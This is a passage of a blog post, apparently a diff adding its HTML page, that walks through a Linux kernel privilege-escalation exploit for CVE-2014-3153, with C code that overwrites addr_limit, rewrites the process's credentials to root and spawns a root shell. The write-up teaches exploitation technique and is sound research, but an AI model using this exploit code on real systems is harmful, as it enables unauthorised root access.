+    <span class="kt">void</span> <span class="o">*</span><span class="n">highest_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Escalating main thread's privileges to root."</span><span class="p">);</span>
+
+    <span class="n">kmemcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">highest_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">corrupter_thread_info</span><span class="o">-&gt;</span><span class="n">addr_limit</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">highest_addr</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Written 0x%x to addr_limit.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">kmemcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">corrupter_thread_info</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">corrupter_task</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">corrupter_thread_info</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Corrupter's task_struct @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">corrupter_task</span><span class="p">);</span>
+
+    <span class="n">kmemcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">corrupter_task</span><span class="o">-&gt;</span><span class="n">group_leader</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main_task</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">corrupter_task</span><span class="o">-&gt;</span><span class="n">group_leader</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Main thread's task_struct @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">main_task</span><span class="p">);</span>
+
+    <span class="n">kmemcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">main_task</span><span class="o">-&gt;</span><span class="n">cred</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main_cred</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">main_task</span><span class="o">-&gt;</span><span class="n">cred</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Main thread's cred @ %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">main_cred</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">COUNT_OF</span><span class="p">(</span><span class="n">main_cred</span><span class="o">-&gt;</span><span class="n">ids</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">kmemcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">root_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main_cred</span><span class="o">-&gt;</span><span class="n">ids</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">root_id</span><span class="p">));</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Escalated privileges to root successfully."</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">escalate_priv</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pthread_t</span> <span class="n">addr_limit_writer</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sigact</span> <span class="o">=</span> <span class="p">{.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">escalate_priv_sighandler</span><span class="p">};</span>
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sigact</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">));</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">USERLOG</span> <span class="s">"Registered the privileges escalator signal handler for interrupting the corrupter thread."</span><span class="p">);</span>
+
+    <span class="n">fake_waiter</span><span class="p">.</span><span class="n">list_entry</span><span class="p">.</span><span class="n">prio_list</span><span class="p">.</span><span class="n">prev</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">corrupter_thread_info</span><span class="o">-&gt;</span><span class="n">addr_limit</span><span class="p">;</span>
+    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">addr_limit_writer</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">lock_pi_futex</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="n">pthread_kill</span><span class="p">(</span><span class="n">corrupter</span><span class="p">,</span> <span class="n">SIGINT</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After we’ve executed <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L138"><code class="language-plaintext highlighter-rouge">leak_thread_info()</code></a>, we’re going to call <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L123"><code class="language-plaintext highlighter-rouge">escalate_priv()</code></a>.
+The first thing that it does is register <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L95"><code class="language-plaintext highlighter-rouge">escalate_priv_sighandler</code></a> as the <code class="language-plaintext highlighter-rouge">SIGINT</code> signal handler using the <a href="https://man7.org/linux/man-pages/man2/sigaction.2.html"><code class="language-plaintext highlighter-rouge">sigaction()</code></a> syscall.</p>
+
+<p>Let’s briefly mention what signal handlers are and why do we use them.
+A signal handler is a function that is called by the target environment when the corresponding signal occurs.
+The target environment <strong>suspends execution</strong> of the program until the signal handler returns.</p>
+
+<p>This mechanism allows us to <strong>interrupt</strong> the process’ job in order to perform some other work.
+In our case, we’d like to form the kernel stack in a certain way and also be able to execute a piece of code on the same thread.
+However, in order to arrange the stack we have to perform a blocking operation because otherwise our arrangement would be overwritten,
+but if you block you can’t exploit the stack’s state.</p>
+
+<p>That’s why signal are needed and why they’re used in our scenario.
+They allow us to execute code within the process’ context <strong>outside its normal execution flow</strong>.</p>
+
+<p>I’m reminding you that when talking about <code class="language-plaintext highlighter-rouge">pthreads</code>, all the signal handlers are shared with the parent process,
+that is because internally <code class="language-plaintext highlighter-rouge">pthreads</code> passes both <code class="language-plaintext highlighter-rouge">CLONE_THREAD | CLONE_SIGHAND</code> flags when it creates the child process with <a href="https://man7.org/linux/man-pages/man2/clone.2.html"><code class="language-plaintext highlighter-rouge">clone()</code></a>.</p>
+
+<blockquote>
+  <p>CLONE_THREAD<br />
+  The flags mask must also include CLONE_SIGHAND if CLONE_THREAD is specified.</p>
+</blockquote>
+
+<p>Afterwards, we’re going to place the address that we want to write to, that is <code class="language-plaintext highlighter-rouge">&amp;corrupter_thread_info-&gt;addr_limit</code>, as the fake waiter’s previous node.
+Once we’ll attempt to lock the futex, the newly created waiter would write its own address to the <code class="language-plaintext highlighter-rouge">addr_limit</code>.
+Not yet something that we can control,
+but rather a value that is guaranteed to be bigger than the current one because <code class="language-plaintext highlighter-rouge">addr_limit</code> is at the bottom-most of the virtual address space.</p>
+
+<p>Now we’ve arrived to a scenario where <code class="language-plaintext highlighter-rouge">addr_limit &gt; &amp;addr_limit</code> is surely true.
+Once this is condition is met, we can simply write to <code class="language-plaintext highlighter-rouge">addr_lmit</code> once again on our own!
+This is where the signaling come into play, and specifically the <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L95"><code class="language-plaintext highlighter-rouge">escalate_priv_sighandler</code></a> from earlier.</p>
+
+<p>Because each thread has its own <a href="https://elixir.bootlin.com/linux/v3.11.4/source/arch/x86/include/asm/thread_info.h#L25"><code class="language-plaintext highlighter-rouge">thread_info</code></a>, which in turn means that each thread also has its own <code class="language-plaintext highlighter-rouge">addr_limit</code>,
+we’d need a way to interrupt the <em>specific</em> thread whose <code class="language-plaintext highlighter-rouge">addr_limit</code> we’ve overwritten.
+Therefore, after we’ve “increased” the address limit, only that thread would be able to utilize and exploit this feature.
+This is where we signal the <code class="language-plaintext highlighter-rouge">addr_limit_writer</code> thread using <code class="language-plaintext highlighter-rouge">pthread_kill()</code> which triggers the execution of <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L95"><code class="language-plaintext highlighter-rouge">escalate_priv_sighandler</code></a>.</p>
+
+<p>What this function does is read and write to different areas in kernel memory.
+In order to do it, I wrote a small helper function called <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c#L40"><code class="language-plaintext highlighter-rouge">kmemcpy()</code></a>.
+It exploits the fact that <code class="language-plaintext highlighter-rouge">addr_limit</code> had been overwritten, it creates a pipe which it reads from and writes to.
+The <code class="language-plaintext highlighter-rouge">read()</code> and <code class="language-plaintext highlighter-rouge">write()</code> syscalls internally invoke <code class="language-plaintext highlighter-rouge">copy_from_user()</code> and <code class="language-plaintext highlighter-rouge">copy_to_user()</code> within the kernel which do the checks according to <code class="language-plaintext highlighter-rouge">addr_limit</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span>
+<span class="nf">_copy_from_user</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">access_ok</span><span class="p">(</span><span class="n">VERIFY_READ</span><span class="p">,</span> <span class="n">from</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span> <span class="c1">// &lt;-- addr_limit comparison</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">__copy_from_user</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">from</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+	<span class="k">else</span>
+		<span class="n">memset</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span>
+<span class="nf">copy_to_user</span><span class="p">(</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">n</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">access_ok</span><span class="p">(</span><span class="n">VERIFY_WRITE</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span> <span class="c1">// &lt;-- addr_limit comparison</span>
+		<span class="n">n</span> <span class="o">=</span> <span class="n">__copy_to_user</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">from</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">n</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">#define access_ok(type, addr, size) \
+	(likely(__range_not_ok(addr, size, user_addr_max()) == 0))
+</span>
+<span class="cp">#define user_addr_max() (current_thread_info()-&gt;addr_limit.seg)
+</span></code></pre></div></div>
+
+<p>At the signal handler several operations are done.</p>
+<ol>
+  <li>Cancel the address space access limitation by setting <code class="language-plaintext highlighter-rouge">addr_limit</code> to the highest value possible.</li>
+  <li>Read the <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a> pointer of the corrupted thread.</li>
+  <li>Read the parent’s <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a> pointer from the corrupted thread’s <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a> via the <code class="language-plaintext highlighter-rouge">group_leader</code> member which points to it.</li>
+  <li>Read the <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102"><code class="language-plaintext highlighter-rouge">cred</code></a> struct pointer from the parent’s <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/sched.h#L1027"><code class="language-plaintext highlighter-rouge">task_struct</code></a>.</li>
+  <li>Overwrite all the identifiers (uid, gid, suid, sgid, etc.) of the main <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102"><code class="language-plaintext highlighter-rouge">cred</code></a> struct.</li>
+</ol>
+
+<h1 id="popping-shell">Popping Shell</h1>
+<p>Now all that’s left to do is <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> on the main thread to drop a shell.<br />
+Because the child process inherits the <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102"><code class="language-plaintext highlighter-rouge">cred</code></a> struct, the shell will also be in <code class="language-plaintext highlighter-rouge">root</code> permissions.</p>
+
+<center><iframe style="width: 720px; height: 400px; margin: 0.5rem" src="https://www.youtube.com/embed/L2pUKvGZtSw" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></center>
+
+<h1 id="concluding">Concluding</h1>
+
+<p>This has been a lot of fun, and I’ve learned so much on the way.<br />
+I got to have the interaction I desired with the kernel, working with it and understanding how it works a bit better.
+Needless to say, there’s an infinite amount of knowledge to be gathered, but that’s a small step onwards.
+At the end, the <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c">exploit</a> seems relatively short, but the truly important part is getting there and being able to solve the puzzle.</p>
+
+<p>The full repository can be found <a href="https://github.com/elongl/CVE-2014-3153">here</a>.</p>
+
+<p>If you have any questions, feel free to contact me and I’ll gladly answer.<br />
+Hope you enjoyed the read. Thanks!</p>
+
+<p>Special thanks to Nspace who helped throughout the process.</p>
+
+
+  </div><a class="u-url" href="/exploitation/2021/01/08/cve-2014-3153.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Elon Gliksberg</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Elon Gliksberg</li><li><a class="u-email" href="mailto:elongliks@gmail.com">elongliks@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/elongl"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">elongl</span></a></li><li><a href="https://www.twitter.com/elongli"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">elongli</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>I like solving problems and taking on challenges.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
